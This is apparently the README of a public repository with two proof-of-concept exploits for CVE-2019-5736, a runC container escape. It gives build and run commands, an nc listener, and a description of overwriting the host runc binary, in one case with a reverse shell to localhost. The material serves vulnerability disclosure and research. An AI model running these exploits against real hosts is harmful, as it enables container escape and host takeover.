# RunC-CVE-2019-5736

Two POCs for CVE-2019-5736.

See [Twistlock Labs](https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-cve-2019-5736/ "Explaining CVE-2019-5763") for an explanation of CVE-2019-5736 and the POCs.

The malicious image POC is heavily based on [q3kâ€™s POC](https://github.com/q3k/cve-2019-5736-poc), so all credit goes to him.

## Running the POCs
Note that running the POCs will overwrite the runC binary on the host. 

It is highly recommened that you create a copy of your runC binary (normally at /usr/sbin/runc) before running one of the POCs.

Clone the repository:
```sh
$ git clone https://github.com/twistlock/RunC-CVE-2019-5736
```

The next 2 sections work from the folder where you cloned the repository but not going into it with `cd`:

### Exec POC
Overwrites runc with a simple program that prints a string.

Running the exec POC:
```sh
$ docker build -t cve-2019-5736:exec_POC ./RunC-CVE-2019-5736/exec_POC
$ docker run -d --rm --name poc_ctr cve-2019-5736:exec_POC
$ docker exec poc_ctr bash
```
### Malicious Image POC
Overwrites runc with a simple reverse shell bash script that connects to localhost:2345.

Listen for the reverse shell:
```sh
$ nc -nvlp 2345
```

From a different shell, run the malicious image POC:
```sh
$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC
$ docker run --rm cve-2019-5736:malicious_image_POC
```
